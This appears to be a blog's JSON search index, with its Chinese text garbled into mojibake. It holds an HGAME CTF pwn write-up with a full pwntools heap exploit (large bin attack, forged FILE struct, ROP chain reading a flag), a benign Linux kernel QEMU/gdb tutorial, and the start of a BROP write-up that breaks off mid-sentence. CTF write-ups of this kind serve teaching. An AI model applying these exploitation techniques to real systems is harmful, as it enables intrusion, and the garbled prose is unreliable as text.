2.29ï¼Œä¸€å †è€æ¼æ´ç”¨äº†åŠå¤©å‘ç°ä¸è¡Œ hhhï¼‰\n\nç¦ç”¨ execve\nVulnerabilities\n\næ˜æ˜¾çš„ UAF æ¼æ´ã€‚\n\nåªèƒ½ç”³è¯· 0x500 ~ 0x900 å¤§å°çš„å †ï¼Œè€ƒè™‘ large bin\nattackã€‚\nExploit\nå †å—å¤§å°é™åˆ¶å¯¼è‡´æˆ‘ä»¬åªèƒ½ä½¿ç”¨ unsorted bin å’Œ\nlarge binï¼Œå³ä½¿é€šè¿‡ UAF æ¼æ´å¯ä»¥ä¿®æ”¹å †ä¸Šçš„\nsize ä»è€Œä½¿å…¶è¿›å…¥ tcache bin\nï¼Œä½†æ˜¯ä¸èƒ½é‡æ–°ç”³è¯·è¿›è¡Œåˆ©ç”¨ã€‚\næ˜¾è€Œæ˜“è§çš„ï¼Œå¯ä»¥åˆ©ç”¨ unsorted bin çš„ç‰¹æ€§å¿«é€Ÿå¾—åˆ° libc\nåŸºå€ã€‚\nåŒæ—¶ï¼Œå¸ƒç½®åç»­çš„å †å—ï¼Œä»¥è¿›è¡Œ large bin attackã€‚\nlarge bin attack çš„æ“ä½œç®€è¦æè¿°å¦‚ä¸‹ï¼Œå½“ç„¶åœ¨ how2heap\nä¸­æœ‰æ›´å¥½æ›´è¯¦ç»†çš„æè¿°ï¼š\n\nç”³è¯·ä¸¤ä¸ª\nchunkï¼Œä¸”å¤§å°ä¸ç›¸åŒï¼Œå¹¶åœ¨å…¶ä¹‹åéƒ½ç”³è¯·ä»»æ„å¤§å°çš„å †å—ï¼Œé˜²æ­¢é‡Šæ”¾ååˆå¹¶ï¼›\né‡Šæ”¾ chunk 0ï¼›\nç”³è¯·ä¸€ä¸ªå¤§äº chunk 0 å¤§å°çš„å †ï¼Œchunk 0 å°†è¿›å…¥\nlarge binï¼›\né‡Šæ”¾ chunk 2ï¼›\nä¿®æ”¹ chunk 0 çš„ bk_nextsize ä¸º\ntarget - 0x20{sizeof(prev_size + fd + bk + fd_nextsize)}\nã€‚\né‡å¤ç¬¬ä¸‰æ­¥ï¼Œchunk 2 å°†è¿›å…¥ large bin ï¼Œç”±äº chunk 2\næ›´å°ï¼Œå¯¼è‡´æ“ä½œ\nbk_nextsize-&gt;fd_nextsize = &amp;chunk2ã€‚\n\næ­¤æ—¶å°±åœ¨ç›®æ ‡ä½ç½®å†™å…¥äº† chunk 2 çš„ prev_size åœ°å€ã€‚\né€šè¿‡ä¸€ç§å«åš House of apple\nçš„æ–¹å¼ï¼Œå°±å¯ä»¥æ”»å‡» IOï¼ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµã€‚\nåœ¨æ³„éœ²å‡º libc åœ°å€åï¼Œè¿›è€Œå¾—åˆ° IO_list_all çš„åœ°å€ï¼Œåˆ©ç”¨\nlarge bin attack å°† chunk åœ°å€å†™å…¥ï¼Œä¹‹ååœ¨ chunk 2 ä¸Šä¼ªé€  FILE\nç»“æ„ä½“ã€‚\nåŸç†éƒ¨åˆ†è¯·è‡ªè¡ŒæŸ¥æ‰¾ï¼ˆæ¯•ç«Ÿæˆ‘è¿˜æ²¡å®Œå…¨å¼„æ˜ç™½ï¼‰ã€‚æˆ‘ä»¬ä¸»è¦å…³æ³¨ä¼ªé€  IO çš„æœ€åä¸€è¡Œï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬è·³è½¬åˆ°ä¸€ä¸ªåœ°å€ï¼Œå³æ§åˆ¶ä¸€æ¬¡\n$RIP ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾åˆ°ä¸€ä¸ª\ngadgetï¼Œå¸®åŠ©æˆ‘ä»¬å®ç°æ ˆè¿ç§»ï¼Œæ‰§è¡Œ ROP é“¾ã€‚\nå¯ä»¥åˆ©ç”¨çš„ gadget å¦‚ä¸‹ï¼š\n\n\ngadget 1\n\nåŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç° $rax æŒ‡å‘ fake_io\næœ‰å…³åœ°å€ï¼Œå› æ­¤å¯ä»¥æ”¹å˜ $rdx çš„å€¼ã€‚\nå°† $rdx æ”¹ä¸ºä¸€å¤„å¯è¯»å†™æ®µï¼Œæ‰§è¡Œä¸‹ä¸€æ®µ gadgetï¼š\n\n\ngadget 2.1\n\n\n\ngadget 2.2\n\nä¿®æ”¹ $rsp å®ç°æ ˆè¿ç§»ï¼Œæ³¨æ„åœ¨åé¢ä¼šå°†\n$rcx=[rdx+0xa8]\nå…¥æ ˆï¼Œæ”¹ä¸ºä¸€ä¸ªå¯¹åç»­æ— å½±å“çš„å¯æ‰§è¡Œåœ°å€å³å¯ï¼Œæˆ–è€… ROP çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚\næœ€åè¿›å…¥ exit() è§¦å‘ç›¸å…³è°ƒç”¨é“¾ï¼Œæ‰§è¡Œ\norwï¼ˆå¦‚æ­¤æœ‰ä»ªå¼æ„Ÿçš„æ“ä½œè‡ªç„¶æ˜¯æ‰‹åŠ¨å®Œæˆï¼‰ã€‚\nfrom pwn import *\ncontext.log_level =\"debug\"\np = remote(\"node1.hgame.vidar.club\",31067)\ne = ELF(\"./vuln\")\nlibc = ELF(\"./libc.so.6\")\n\n\ndef add(index,size):\n    p.sendlineafter(\"5. Exit\",b\"1\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendlineafter(\"Size: \",str(size))\ndef show(index):\n    p.sendlineafter(\"5. Exit\",b\"4\")\n    p.sendlineafter(\"Index:\",str(index))\ndef dele(index):\n    p.sendlineafter(\"5. Exit\",b\"2\")\n    p.sendlineafter(\"Index:\",str(index))\ndef edit(index,content):\n    p.sendlineafter(\"5. Exit\",b\"3\")\n    p.sendlineafter(\"Index:\",str(index))\n    p.sendafter(\"Content: \",content)\n    \n    \nadd(0,0x528)\nadd(1,0x508) #prevent consolidating\nadd(2,0x518)\nadd(3,0x721)\ndele(0)\nshow(0)\n\n\nmain_arena = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nlibc_base = main_arena - 0x203b20\nIO_list_all=libc_base+libc.symbols['_IO_list_all']\n_IO_stdfile_2_lock=libc_base+0x205700\n\n_open=libc_base+libc.sym['open']\n_read=libc_base+libc.sym['read']\n_write=libc_base+libc.sym['write']\n\npop_rdi = libc_base + 0x10f75b\npop_rsi = libc_base + 0x110a4d\npop_rdx = libc_base + 0x66b9a #pop rdx ; ret 0x19\n\ngadget = libc_base + 0x176f0e\nsetcontext = libc_base + 0x4a98d\nret = libc_base + 0x2882f\nlog.info(hex(libc_base))\n\n\nadd(4,0x558)\ndele(2)\nshow(0)\nchunk_fd = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nedit(0,b'a'*16)\nshow(0)\nfd_nextsize = u64(p.recvuntil('\\x0a\\x31',drop=True)[-6:].ljust(8, b'\\x00'))\nheap_base = fd_nextsize + 0x10\nlog.info(hex(heap_base))\n\n\nedit(0,p64(chunk_fd)*2+p64(fd_nextsize)+p64(IO_list_all-0x20))\nadd(5,0x558) #large bin attack: write chunk address at target\n\n\norw_addr = heap_base + 0x1bf0\nfile_addr = heap_base + 0xa30\nIO_wide_data_addr=file_addr\nwide_vtable_addr=file_addr+0xe8-0x68\n\nfake_io = b\"\"\nfake_io += p64(0)  # _IO_read_end\nfake_io += p64(0)  # _IO_read_base\nfake_io += p64(0)  # _IO_write_base\nfake_io += p64(1)  # _IO_write_ptr\nfake_io += p64(0)  # _IO_write_end\nfake_io += p64(0)  # _IO_buf_base;\nfake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)\nfake_io += p64(0)  # _IO_save_base\nfake_io += p64(0)*3  # from _IO_backup_base to _markers\nfake_io += p64(0)  # the FILE chain ptr\nfake_io += p32(2)  # _fileno for stderr is 2\nfake_io += p32(0)  # _flags2, usually 0\nfake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1\nfake_io += p16(0)  # _cur_column\nfake_io += b\"\\x00\"  # _vtable_offset\nfake_io += b\"\\n\"  # _shortbuf[1]\nfake_io += p32(0)  # padding\nfake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock\nfake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1\nfake_io += p64(0)  # _codecvt, usually 0\nfake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1\nfake_io += p64(0) * 2  # from _freeres_list to __pad5\nfake_io += p64(orw_addr+0x100) #rdx value(__pad5)\nfake_io += p32(0xFFFFFFFF)  # _mode, usually -1\nfake_io += b\"\\x00\" * 19  # _unused2\nfake_io = fake_io.ljust(0xc8, b'\\x00')  # adjust to vtable\nfake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # fake vtable\nfake_io += p64(wide_vtable_addr)\nfake_io += p64(gadget) #set rdx\nedit(2,fake_io)\n\norw_payload = flat({\n    0x00: [\n        p64(pop_rdi),\n        p64(orw_addr+0x128),\n        p64(pop_rsi),\n        p64(0),\n        p64(pop_rdx),\n        p64(0),\n        p64(_open), # open(./flag,0,0)\n        b'a'*0x19, # padding\n        p64(pop_rdi),\n        p64(3),\n        p64(pop_rsi),\n        p64(orw_addr+0x200),\n        p64(pop_rdx),\n        p64(0x30),\n        p64(_read), # read(3,buf,0x30)\n        b'a'*0x19,\n        p64(pop_rdi),\n        p64(1),\n        p64(pop_rsi),\n        p64(orw_addr+0x200),\n        p64(pop_rdx),\n        p64(0x30),\n        p64(_write), # write(1,buf,0x30)\n        b'a'*0x19,\n    ],\n    0x120: [\n        p64(setcontext),\n        b'./flag\\x00\\x00',\n    ],\n    0x1a0: [\n        p64(orw_addr), #rsp value\n        p64(ret),\n    ]\n})\nedit(5,orw_payload)\nedit(1,b'a'*0x500+b' sh;') #reserved for debug, [$rdi]\n\n\np.interactive()\nHit list\nå¾ˆé—æ†¾æœ¬é¢˜æ²¡æœ‰è§£å‡ºï¼Œå› ä¸ºå‰é¢è¾ƒå°‘æ¥è§¦çš„å †é¢˜è€—è´¹äº†æˆ‘æŒºå¤šå¿ƒåŠ›çš„ï¼Œåˆ°è¿™å·²ç»æ²¡ä»€ä¹ˆç²¾åŠ›å»åšäº†ã€‚ä¸è¿‡æ”¶è·å¾ˆå¤šï¼Œæ˜¯å¤§äºé—æ†¾çš„ã€‚\næ˜å¹´è§ï¼\nå¹³å°å¾ˆå¥½çœ‹ï¼Œå‡ºé¢˜äººå¾ˆçƒ­å¿ƒï¼Œé¢˜ç›®å¾ˆéš¾ï¼ˆ\nhgame{see_you_next_year!!!}\n","categories":["CTF"],"tags":["pwn","hgame"]},{"title":"Linux Kernel: build, boot and debug in QEMU","url":"/categories/Study/kernel-build/","content":"ä¸€æ¬¡å†…æ ¸ç¼–è¯‘åˆ°è¿è¡Œçš„å°è¯•\nç¼–è¯‘å†…æ ¸\næ‹‰å–æºç \n$ git clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n\nè°ƒæ•´é…ç½®\nä¸ºäº†è®© gdb å¯ä»¥è°ƒè¯•å†…æ ¸å¹¶åŠ è½½ç¬¦å·ï¼Œéœ€è¦æ›´æ”¹ä¸€äº›ç¼–è¯‘é€‰é¡¹.\n$ make menuconfig\nKernel hacking  ---&gt;\n\t[*] Kernel debugging\n\tCompile-time checks and compiler options  ---&gt;\n\t\tDebug information (Rely on the toolchain's implicit default DWARF version)\n\t\t[*] Provide GDB scripts for kernel debugging\nç¼–è¯‘\n$ make -j$(nproc)\n$ make bzImage\nå†…æ ¸å¯åŠ¨æµç¨‹\næˆ‘ä»¬å¹¶ä¸éœ€è¦å¼„æ¸…æ¥šå¯åŠ¨è¿‡ç¨‹çš„æ‰€æœ‰ç»†èŠ‚ï¼Œ\nè¿™é‡Œåªç®€ç•¥ä»‹ç»ä»¥ä¾¿äºè§£é‡Šåæ–‡çš„æ“ä½œ\nKernel Initialization\nè¿™ä¸ªé˜¶æ®µå†…æ ¸ä¼šå°†æ˜ åƒè‡ªè§£å‹åˆ°å†…å­˜ä¸­ï¼Œå¹¶ä¸”è¿›è¡Œç¡¬ä»¶ç›¸å…³çš„åˆå§‹åŒ–ï¼Œ\nè®¾ç½®ä¸­æ–­å¤„ç† (interrupt handling)ã€å†…å­˜ç®¡ç† (memory management),\næŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿ (/) æˆ–è€…åˆå§‹ RAM ç£ç›˜ (initrd), åŠ è½½é©±åŠ¨.\nInit process\nå†…æ ¸åˆå§‹åŒ–åï¼Œå°±ä¼šå‡†å¤‡æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„ç”¨æˆ·ç©ºé—´ (Userspace) çš„åˆå§‹åŒ–.\näº‹å®ä¸Šå†…æ ¸ä¼šæ‰§è¡Œ /sbin/init, /etc/init æˆ–\ninitramfs/initrd ä¸­æŒ‡å®šçš„ç¬¬ä¸€ä¸ªç”¨æˆ·ç©ºé—´ç¨‹åº (é€šå¸¸æ˜¯ Systemdã€SysVinit æˆ–\nOpenRC), ä½œä¸ºç”¨æˆ·ç©ºé—´ä¸­çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ (PID=1),\nå½“ç„¶å®ƒå¯ä»¥æ˜¯ä»»ä½•å¯æ‰§è¡Œçš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬ shell script.\nä½¿ç”¨ QEMU è¿è¡Œå†…æ ¸\næ„å»º rootfs\næ ¹æ–‡ä»¶ç³»ç»Ÿéµå¾ª https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard,\nè¿™é‡Œä½¿ç”¨ Arch Linux çš„ pacstrap æ¥æ„å»ºä¸€ä¸ªè¾ƒç®€å•çš„ rootfs:\n#!/bin/bash\n\nset -e\n\nROOTFS_DIR=\"test_kernel/arch_full_rootfs\"\n\nif [ -d \"$ROOTFS_DIR\" ]; then\n    sudo rm -rf \"$ROOTFS_DIR\"\nfi\n\nmkdir -p \"$ROOTFS_DIR\"\n\nsudo pacstrap -K -c \"$ROOTFS_DIR\" \\\n    base \\\n    linux-firmware \\\n    bash \\\n    coreutils \\\n    util-linux \\\n    procps-ng \\\n    iproute2 \\\n    iputils \\\n    net-tools \\\n    vim \\\n    nano \\\n    less \\\n    grep \\\n    sed \\\n    gawk \\\n    tar \\\n    gzip \\\n    which \\\n    man-db \\\n    man-pages\n\nsudo arch-chroot \"$ROOTFS_DIR\" passwd -d root\n\nsudo tee \"$ROOTFS_DIR/init\" &gt; /dev/null &lt;&lt; 'EOF'\n#!/bin/bash\n\nmount -t proc proc /proc\nmount -t sysfs sys /sys\nmount -t devtmpfs dev /dev\nmount -t tmpfs tmp /tmp\nmkdir -p /dev/pts /dev/shm\nmount -t devpts devpts /dev/pts\nmount -t tmpfs shm /dev/shm\n\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nexport HOME=/root\nexport TERM=linux\n\nif [ -x /usr/lib/systemd/systemd-udevd ]; then\n    /usr/lib/systemd/systemd-udevd --daemon 2&gt;/dev/null\n    udevadm trigger --action=add 2&gt;/dev/null\n    udevadm settle 2&gt;/dev/null\nfi\n\nclear\n\nexec /bin/bash --login\nEOF\n\nsudo chmod +x \"$ROOTFS_DIR/init\"\n\nsudo mkdir -p \"$ROOTFS_DIR\"/{dev,proc,sys,run,tmp}\nç„¶åä½¿ç”¨å¦‚ä¸‹è„šæœ¬å°†å…¶æ‰“åŒ…ä¸º ext4 image:\n#!/bin/bash\n\nset -e\n\nROOTFS_DIR=\"test_kernel/arch_full_rootfs\"\nIMAGE_FILE=\"test_kernel/arch_full.ext4\"\nIMAGE_SIZE=\"4G\"  \n\nif [ ! -d \"$ROOTFS_DIR\" ]; then\n    exit 1\nfi\n\nif [ -f \"$IMAGE_FILE\" ]; then\n    rm -f \"$IMAGE_FILE\"\nfi\n\ndd if=/dev/zero of=\"$IMAGE_FILE\" bs=1M count=0 seek=$(echo $IMAGE_SIZE | sed 's/G/*1024/;s/M//;' | bc) status=progress\n\nmkfs.ext4 -F -L \"arch-rootfs\" \"$IMAGE_FILE\"\n\nMOUNT_POINT=$(mktemp -d)\nsudo mount -o loop \"$IMAGE_FILE\" \"$MOUNT_POINT\"\n\nsudo cp -a \"$ROOTFS_DIR/\"* \"$MOUNT_POINT/\"\n\nsync\nsudo umount \"$MOUNT_POINT\"\nrmdir \"$MOUNT_POINT\"\n\nsudo chown $USER:$USER \"$IMAGE_FILE\"\næˆ‘ä»¬å°è¯•ä½¿ç”¨å¦‚ä¸‹å‚æ•°è¿è¡Œ QEMU\n$ KERNEL=\"arch/x86/boot/bzImage\"\n$ ROOTFS=\"test_kernel/arch_full.ext4\"\n$ qemu-system-x86_64 \\\n  -kernel \"$KERNEL\" \\\n  -drive file=\"$ROOTFS\",format=raw,if=virtio \\\n  -m 4G \\\n  -smp 4 \\\n  -append \"console=ttyS0\" \\\n  -nographic\né¢„æœŸä¸‹ï¼Œä¼šäº§ç”Ÿ Kernel panic:\n[    1.983880] /dev/root: Can't open blockdev\n[    1.987750] List of all bdev filesystems:\n[    1.987876]  fuseblk\n[    1.987891] \n[    1.988146] Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0)\n[    1.988715] CPU: 1 UID: 0 PID: 1 Comm: swapper/0 Not tainted 6.18.0-rc3 #5 PREEMPT(voluntary)  2b0b48d497e5105aac88eb0a7903527369b0379b\n[    1.989240] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.17.0-2-2 04/01/2014\n[    1.989766] Call Trace:\n[    1.989950]  &lt;TASK&gt;\n[    1.990291]  dump_stack_lvl+0x5d/0x80\n[    1.990581]  vpanic+0xdb/0x2d0\n[    1.990658]  panic+0x6b/0x6b\n[    1.990732]  mount_root_generic+0x1cf/0x270\n[    1.990903]  prepare_namespace+0x1dc/0x230\n[    1.991032]  kernel_init_freeable+0x282/0x2b0\n[    1.991163]  ? __pfx_kernel_init+0x10/0x10\n[    1.991305]  kernel_init+0x1a/0x140\n[    1.991398]  ret_from_fork+0x1c2/0x1f0\n[    1.991483]  ? __pfx_kernel_init+0x10/0x10\n[    1.991592]  ret_from_fork_asm+0x1a/0x30\n[    1.991723]  &lt;/TASK&gt;\n[    1.993053] Kernel Offset: disabled\n[    1.993394] ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0) ]---\nè¿™æ˜¯å› ä¸º ext4 ç›¸å…³çš„åŠŸèƒ½ç¼–è¯‘ä¸ºäº†å†…æ ¸æ¨¡å—ï¼Œè€Œä¸”å¹¶æ²¡æœ‰åŠ è½½è¿›å†…æ ¸.\nå€ŸåŠ© initramfs, æˆ‘ä»¬å¯ä»¥å…ˆåœ¨å…¶ä¸­åŠ è½½ ext4 ç›¸å…³æ¨¡å—ï¼Œ\nç„¶åå†æŒ‚è½½çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿ.\næ„å»º initramfs\nä½¿ç”¨å¦‚ä¸‹è„šæœ¬æ„å»ºä¸€ä¸ªå®éªŒæ€§çš„ initramfs:\n#!/bin/bash\nset -e\n\nINITRAMFS_DIR=\"test_kernel/initramfs\"\nINITRAMFS_FILE=\"test_kernel/initramfs.cpio.gz\"\nKERNEL_VERSION=$(make kernelrelease 2&gt;/dev/null)\n\nif [ -d \"$INITRAMFS_DIR\" ]; then\n    rm -rf \"$INITRAMFS_DIR\"\nfi\n\nmkdir -p \"$INITRAMFS_DIR\"/{bin,sbin,etc,proc,sys,dev,newroot,lib/modules}\n\ncp /bin/busybox \"$INITRAMFS_DIR/bin/\"\nchmod +x \"$INITRAMFS_DIR/bin/busybox\"\n\ncd \"$INITRAMFS_DIR/bin\"\nfor cmd in sh mount umount mkdir mknod switch_root insmod modprobe cat echo sleep ls; do\n    ln -sf busybox $cmd\ndone\ncd - &gt; /dev/null\n\nMODULE_DIR=\"$INITRAMFS_DIR/lib/modules/$KERNEL_VERSION\"\nmkdir -p \"$MODULE_DIR/kernel/fs/ext4\"\nmkdir -p \"$MODULE_DIR/kernel/fs/jbd2\"\nmkdir -p \"$MODULE_DIR/kernel/fs/mbcache\"\nmkdir -p \"$MODULE_DIR/kernel/crypto\"\n\nfor module in ext4 jbd2 mbcache crc16; do\n    MODULE_PATH=$(find . -name \"${module}.ko\" -o -name \"${module}.ko.gz\" -o -name \"${module}.ko.xz\" | head -1)\n    if [ -n \"$MODULE_PATH\" ]; then\n        echo \"  æ‰¾åˆ°: $module -&gt; $MODULE_PATH\"\n        cp \"$MODULE_PATH\" \"$MODULE_DIR/\"\n    else\n        echo \"  è­¦å‘Š: æœªæ‰¾åˆ° $module æ¨¡å—\"\n    fi\ndone\n\ncd \"$INITRAMFS_DIR\"\ncat &gt; \"lib/modules/$KERNEL_VERSION/modules.dep\" &lt;&lt; EOF\nkernel/fs/ext4/ext4.ko: kernel/fs/jbd2/jbd2.ko kernel/fs/mbcache/mbcache.ko\nkernel/fs/jbd2/jbd2.ko: kernel/crypto/crc16.ko\nkernel/fs/mbcache/mbcache.ko:\nkernel/crypto/crc16.ko:\nEOF\n\ntouch \"lib/modules/$KERNEL_VERSION/modules.order\"\ncd - &gt; /dev/null\n\ncat &gt; \"$INITRAMFS_DIR/init\" &lt;&lt; 'INIT_SCRIPT'\n#!/bin/sh\n\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs devtmpfs /dev\n\nsleep 1\n\necho \"åŠ è½½å†…æ ¸æ¨¡å—...\"\ninsmod /lib/modules/*/crc16.ko 2&gt;/dev/null || echo \"  crc16 å·²åŠ è½½æˆ–ä¸éœ€è¦\"\ninsmod /lib/modules/*/mbcache.ko 2&gt;/dev/null || echo \"  mbcache å·²åŠ è½½æˆ–ä¸éœ€è¦\"\ninsmod /lib/modules/*/jbd2.ko 2&gt;/dev/null || echo \"  jbd2 å·²åŠ è½½æˆ–ä¸éœ€è¦\"\ninsmod /lib/modules/*/ext4.ko 2&gt;/dev/null || echo \"  ext4 å·²åŠ è½½æˆ–ä¸éœ€è¦\"\n\necho \"\"\necho \"å†…æ ¸æ¨¡å—åŠ è½½å®Œæˆ\"\necho \"\"\n\nif [ ! -b /dev/vda ]; then\n    echo \"é”™è¯¯: æ ¹è®¾å¤‡ /dev/vda ä¸å­˜åœ¨\"\n    echo \"å¯ç”¨çš„å—è®¾å¤‡:\"\n    ls -l /dev/vd* 2&gt;/dev/null || echo \"  æœªæ‰¾åˆ° virtio å—è®¾å¤‡\"\n    echo \"\"\n    echo \"å¯åŠ¨ shell è¿›è¡Œè°ƒè¯•...\"\n    exec /bin/sh\nfi\n\necho \"æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿ /dev/vda...\"\nmount -t ext4 /dev/vda /newroot\n\nif [ $? -ne 0 ]; then\n    echo \"é”™è¯¯: æ— æ³•æŒ‚è½½æ ¹æ–‡ä»¶ç³»ç»Ÿ\"\n    echo \"\"\n    echo \"å¯åŠ¨ shell è¿›è¡Œè°ƒè¯•...\"\n    exec /bin/sh\nfi\n\necho \"æ ¹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½æˆåŠŸ\"\necho \"\"\n\nif [ ! -x /newroot/init ]; then\n    echo \"é”™è¯¯: /newroot/init ä¸å­˜åœ¨æˆ–ä¸å¯æ‰§è¡Œ\"\n    echo \"\"\n    echo \"å¯åŠ¨ shell è¿›è¡Œè°ƒè¯•...\"\n    umount /newroot\n    exec /bin/sh\nfi\n\numount /proc\numount /sys\numount /dev\n\nexec switch_root /newroot /init\nINIT_SCRIPT\n\nchmod +x \"$INITRAMFS_DIR/init\"\n\ncd \"$INITRAMFS_DIR\"\nfind . -print0 | cpio --null --create --format=newc 2&gt;/dev/null | gzip -9 &gt; \"../$(basename $INITRAMFS_FILE)\"\ncd - &gt; /dev/null\nç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤:\n$ KERNEL=\"arch/x86/boot/bzImage\"\n$ INITRAMFS=\"test_kernel/initramfs.cpio.gz\"\n$ ROOTFS=\"test_kernel/arch_full.ext4\"\n$ qemu-system-x86_64 \\\n  -kernel \"$KERNEL\" \\\n  -initrd \"$INITRAMFS\" \\\n  -drive file=\"$ROOTFS\",format=raw,if=virtio \\\n  -m 4G \\\n  -smp 4 \\\n  -append \"console=ttyS0\" \\\n  -nographic\n\nåŠ è½½å†…æ ¸æ¨¡å—\nåœ¨æˆåŠŸå¯åŠ¨çš„ QEMU ç¯å¢ƒå†…è¾“å…¥ lsmod,\nä¼šå‘ç°åªåŠ è½½äº†å‡ ä¸ªæ¨¡å—\n[root@archlinux /]# lsmod\nModule                  Size  Used by\next4                 1159168  1\njbd2                  200704  1 ext4\nmbcache                20480  1 ext4\ncrc16                  12288  1 ext4\nåœ¨ Linux ä¸­ï¼Œ\nå†…æ ¸æ¨¡å—å­˜æ”¾åœ¨ /usr/lib/modules/*kernel_release*/ ä½ç½®.\næˆ‘ä»¬éœ€è¦åœ¨ rootfs æ‰“åŒ…å‰å°†ç¼–è¯‘å¥½çš„æ¨¡å—æ”¾å…¥:\n$ make modules_install INSTALL_MOD_PATH=/home/summer/git/linux/test_kernel/arch_full_rootfs\nä½¿ç”¨ gdb è°ƒè¯•å†…æ ¸\nåœ¨ QEMU çš„å¯åŠ¨å‘½ä»¤æ·»åŠ ä¸‹åˆ—å‚æ•°:\nqemu-system-x86_64 \\\n  ... \\\n  -s \\ #run a gdb server at tcp::1234\n  -S   #pause simulator until a `continue` from gdb\nkernel åœ¨ç¼–è¯‘æ—¶æä¾›äº†å¸¦ç¬¦å·çš„å†…æ ¸æ–‡ä»¶ vmlinux å’Œä¸€ä¸ª gdb è„šæœ¬ vmlinux-gdb.py\nåŠ è½½è¯¥æ–‡ä»¶ç„¶åè¿æ¥ QEMU, å°±å¯ä»¥å¯¹å†…æ ¸è¿›è¡Œè°ƒè¯•äº†.\n\n\ngdb attach\n\n\n\nstart_kernel\n\nReferences\n\nhttps://en.wikipedia.org/wiki/Booting_process_of_Linux#Kernel\nhttps://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard\nhttps://wiki.archlinux.org/title/Kernel_module\n\n","categories":["Study"],"tags":["kernel","QEMU","debug"]},{"title":"HGAME 2025 Final å¤ç°","url":"/categories/CTF/hgame-2025-final/","content":"Backto2016\n\nä½†ä½ å¿…é¡»å…ˆå‘æˆ‘ä»¬è¯æ˜è‡ªå·±æœ‰å›åˆ° 2016 çš„å®åŠ›ï¼\nç¥ä½ ç©çš„å¼€å¿ƒ o (ï¿£â–½ï¿£) ãƒ–\næ²¡æœ‰é™„ä»¶æ˜¯æ­£å¸¸çš„å–µ\nè¿™ä¸ªåˆ†æ•°æˆ–è®¸ä¹Ÿè€ƒè™‘äº†ä¹° hint è¿™ä»¶äº‹ï¼Œåˆ«å®³æ€•å˜»å˜»\n\nè¿™é“é¢˜æ˜¯æ²¡æœ‰ç»™å‡ºé™„ä»¶çš„ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®è¾“å…¥å’Œç¨‹åºçš„è¾“å‡ºè·å–ä¸€åˆ‡ä¿¡æ¯ã€‚\n\n\nVulnerabilities\néšä¾¿è¾“å…¥ä¸€äº›å­—ç¬¦ä¼šå‘ç°ï¼Œç¨‹åºå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œå‡ºé¢˜äººå¾ˆå‹å¥½åœ°æä¾›äº†ç¨‹åºå´©æºƒçš„æ›´å¤šä¿¡æ¯ï¼ˆ***\nstack smashing detected ***: terminatedï¼‰\nå­˜åœ¨ Canary ä¿æŠ¤ã€‚\n\næ³¨æ„åˆ°åœ¨äº¤äº’è¿›ç¨‹ç»“æŸåï¼Œä¼šä¿æŒè¿æ¥ï¼Œè¿”å›ä¸€ä¸ª PID+1 çš„æ–°è¿›ç¨‹ï¼Œè¿™æç¤ºæˆ‘ä»¬ç¨‹åºä½¿ç”¨ fork() å®ç°åŠŸèƒ½ã€‚\n\n\nèµ›åæ”¾å‡ºçš„æºç \n\nå› æ­¤ï¼Œå­è¿›ç¨‹çš„ Canary å€¼ä¸ä¼šæ”¹å˜ã€‚\nExploit\nä»é¢˜ç›®çš„æç¤ºå¯ä»¥çŸ¥é“ï¼Œå…¶å®è¿™æ˜¯ç±»ä¼¼äº HCTF2016 brop1 çš„ä¸€é“é¢˜ç›®ã€‚\nè¿ç”¨çš„æ”»å‡»æ–¹æ³•å«åš Blind Return Oriented Programming (BROP)2ã€‚\nBROP çš„ä¸»è¦æµç¨‹ï¼š\n\nç»•è¿‡ Canary å’Œ PIE çš„ä¿æŠ¤ï¼›\nå¯»æ‰¾ \"stop gadget\";\n å¯»æ‰¾æ§åˆ¶å¯„å­˜å™¨çš„ gadget;\ndump memory to get the binary\n è·å¾— libc baseï¼Œç„¶å get shell\n\nCanary bypass\nBROP é¦–å…ˆéœ€è¦æˆ‘ä»¬ç»•è¿‡ Canaryï¼š\n\n\nStack reading. A single byte on the stack\nis overwritten with guess X. If the service crashes, the wrong value was\nguessed.\n\nStop gadget\nStop gadget æŒ‡çš„æ˜¯å¯ä»¥å°†ç¨‹åºæŒ‚èµ·çš„ä¸€æ®µ gadgetã€‚\nä¸ºä»€ä¹ˆéœ€è¦ Stop gadget? å¦‚æœæˆ‘ä»¬å°† Return\naddress è¦†ç›–æˆéšæœºçš„æ•°æ®ï¼Œé‚£ä¹ˆå¾ˆå¤§æ¦‚ç‡ä¼šå¼•å‘æ®µé”™è¯¯ã€‚è€Œ Stop\ngadget èƒ½è®©ç¨‹åºä¿æŒæ­£å¸¸è¿è¡Œï¼Œåœ¨å¯»æ‰¾å…¶ä»– gadget 